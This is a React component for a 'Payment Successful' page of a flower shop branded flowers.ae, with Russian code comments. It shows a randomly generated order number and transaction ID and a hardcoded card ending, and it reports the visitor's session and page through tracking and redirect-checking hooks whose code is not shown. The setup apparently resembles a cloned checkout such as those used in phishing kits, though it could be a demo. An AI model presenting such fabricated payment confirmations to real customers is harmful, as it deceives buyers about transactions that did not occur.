import { useRedirectChecker } from "../../hooks/useRedirectChecker";
import styles from "./Success.module.css";
import { useNavigate } from "react-router-dom";
import { useCart } from "../../context/cartContext"; // Импортируем хук корзины
import { useOnlineStatus } from "../../hooks/useOnlineStatus";

interface OrderDetails {
  orderNumber: string;
  totalAmount: number;
  paymentMethod: string;
  transactionId: string;
  estimatedDelivery: string;
  items: Array<{
    id: number;
    title: string;
    quantity: number;
    price: number;
    image: string;
  }>;
}

const PaymentSuccess = () => {
  const sessionId = localStorage.getItem("currentSessionId");
  useOnlineStatus({ sessionId, pageName: "success", enabled: true });
  useRedirectChecker(3000);
  const navigate = useNavigate();
  const { state, clearCart } = useCart(); // Получаем состояние корзины и функцию очистки

  // Используем данные из корзины вместо моковых данных
  const orderDetails: OrderDetails = {
    orderNumber: "FLW-" + Math.random().toString(36).substr(2, 9).toUpperCase(),
    totalAmount: state.total, // Используем общую сумму из контекста
    paymentMethod: "Visa •••• 1234",
    transactionId:
      "TXN-" + Math.random().toString(36).substr(2, 12).toUpperCase(),
    estimatedDelivery: new Date(
      Date.now() + 24 * 60 * 60 * 1000
    ).toLocaleDateString("en-AE", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric",
    }),
    items: state.cart.map((item) => ({
      id: item.id,
      title: item.title,
      quantity: item.quantity,
      price: item.price,
      image: item.image,
    })),
  };


  const handleContinueShopping = () => {
    // Очищаем корзину при продолжении покупок
    clearCart();
    navigate("/");
  };

  // Если корзина пуста, показываем сообщение
  if (state.cart.length === 0) {
    return (
      <div className={styles.success__container}>
        <div className={styles.success__wrapper}>
          <div className={styles.success__content}>
            <div className={styles.details__section}>
              <div className={styles.details__container}>
                <div className={styles.success__header}>
                  <h1>Заказ обрабатывается</h1>
                  <p className={styles.success__message}>
                    Информация о вашем заказе загружается...
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className={styles.success__container}>
      <div className={styles.success__wrapper}>
        {/* Header */}
        <header className={styles.success__header}>
          <div className={styles.header__content}>
            <div className={styles.logo}>
              <span>flowers.ae</span>
            </div>
            <nav className={styles.breadcrumb}>
              <span className={styles.active}>Payment Successful</span>
            </nav>
          </div>
        </header>

        <div className={styles.success__content}>
          {/* Left Side - Success Message & Order Details */}
          <div className={styles.details__section}>
            <div className={styles.details__container}>
              {/* Success Animation */}
              <div className={styles.success__animation}>
                <div className={styles.checkmark__circle}>
                  <div className={styles.checkmark}></div>
                </div>
              </div>

              <div className={styles.success__header}>
                <h1>Payment Successful! 🎉</h1>
                <p className={styles.success__message}>
                  Thank you for your order! Your payment has been processed
                  successfully.
                </p>
              </div>

              {/* Order Summary */}
              <div className={styles.order__summary}>
                <h2>Order Summary</h2>

                <div className={styles.summary__grid}>
                  <div className={styles.summary__item}>
                    <span className={styles.label}>Order Number:</span>
                    <span className={styles.value}>
                      {orderDetails.orderNumber}
                    </span>
                  </div>
                  <div className={styles.summary__item}>
                    <span className={styles.label}>Total Amount:</span>
                    <span className={styles.value}>
                      AED {orderDetails.totalAmount.toFixed(2)}
                    </span>
                  </div>
                  <div className={styles.summary__item}>
                    <span className={styles.label}>Transaction ID:</span>
                    <span className={styles.value}>
                      {orderDetails.transactionId}
                    </span>
                  </div>
                  <div className={styles.summary__item}>
                    <span className={styles.label}>Estimated Delivery:</span>
                    <span className={styles.value}>
                      {orderDetails.estimatedDelivery}
                    </span>
                  </div>
                </div>
              </div>

              {/* Order Items */}
              <div className={styles.order__items}>
                <h3>Order Items</h3>
                <div className={styles.items__list}>
                  {orderDetails.items.map((item) => (
                    <div key={item.id} className={styles.item}>
                      <div className={styles.item__image}>
                        <img src={item.image} alt={item.title} />
                      </div>
                      <div className={styles.item__details}>
                        <h4 className={styles.item__title}>{item.title}</h4>
                        <p className={styles.item__quantity}>
                          Quantity: {item.quantity}
                        </p>
                      </div>
                      <div className={styles.item__price}>
                        AED {(item.price * item.quantity).toFixed(2)}
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Action Buttons */}
              <div className={styles.action__buttons}>
                <button
                  onClick={handleContinueShopping}
                  className={styles.continue__btn}
                >
                  Continue Shopping
                </button>
              </div>

              {/* Auto Redirect Notice */}
              <div className={styles.redirect__notice}></div>
            </div>
          </div>

          {/* Right Side - Next Steps & Support */}
          <div className={styles.info__section}>
            <div className={styles.info__container}>
              <h3>What's Next?</h3>

              {/* Next Steps */}
              <div className={styles.next__steps}>
                <div className={styles.step}>
                  <div className={styles.step__icon}>📧</div>
                  <div className={styles.step__content}>
                    <h4>Order Confirmation</h4>
                    <p>You'll receive an email confirmation within 5 minutes</p>
                  </div>
                </div>

                <div className={styles.step}>
                  <div className={styles.step__icon}>📦</div>
                  <div className={styles.step__content}>
                    <h4>Order Processing</h4>
                    <p>We'll start preparing your order immediately</p>
                  </div>
                </div>

                <div className={styles.step}>
                  <div className={styles.step__icon}>🚚</div>
                  <div className={styles.step__content}>
                    <h4>Delivery Updates</h4>
                    <p>Get real-time SMS updates about your delivery</p>
                  </div>
                </div>

                <div className={styles.step}>
                  <div className={styles.step__icon}>🏠</div>
                  <div className={styles.step__content}>
                    <h4>Enjoy Your Flowers</h4>
                    <p>Fresh flowers delivered to your doorstep</p>
                  </div>
                </div>
              </div>

              {/* Delivery Information */}
              <div className={styles.delivery__info}>
                <h4>Delivery Information</h4>
                <div className={styles.info__grid}>
                  <div className={styles.info__item}>
                    <span className={styles.info__icon}>⏰</span>
                    <div>
                      <p className={styles.info__title}>Delivery Time</p>
                      <p className={styles.info__detail}>
                        Same-day delivery available
                      </p>
                    </div>
                  </div>
                  <div className={styles.info__item}>
                    <span className={styles.info__icon}>🎁</span>
                    <div>
                      <p className={styles.info__title}>Free Delivery</p>
                      <p className={styles.info__detail}>
                        On orders over AED 245
                      </p>
                    </div>
                  </div>
                  <div className={styles.info__item}>
                    <span className={styles.info__icon}>📞</span>
                    <div>
                      <p className={styles.info__title}>Contact Driver</p>
                      <p className={styles.info__detail}>
                        You'll get driver details before delivery
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Support Section */}
              <div className={styles.support__section}>
                <h4>Need Help?</h4>
                <div className={styles.support__options}>
                  <div className={styles.support__option}>
                    <span className={styles.support__icon}>📞</span>
                    <div>
                      <p className={styles.support__title}>Call Us</p>
                      <p className={styles.support__detail}>+971 4 123 4567</p>
                    </div>
                  </div>
                  <div className={styles.support__option}>
                    <span className={styles.support__icon}>💬</span>
                    <div>
                      <p className={styles.support__title}>Live Chat</p>
                      <p className={styles.support__detail}>Available 24/7</p>
                    </div>
                  </div>
                  <div className={styles.support__option}>
                    <span className={styles.support__icon}>✉️</span>
                    <div>
                      <p className={styles.support__title}>Email Support</p>
                      <p className={styles.support__detail}>
                        support@flowers.ae
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Customer Satisfaction */}
              <div className={styles.satisfaction__section}>
                <div className={styles.satisfaction__badge}>
                  <span className={styles.badge__icon}>⭐</span>
                  <div>
                    <p className={styles.badge__title}>
                      100% Satisfaction Guaranteed
                    </p>
                    <p className={styles.badge__detail}>
                      Love your flowers or we'll make it right
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentSuccess;
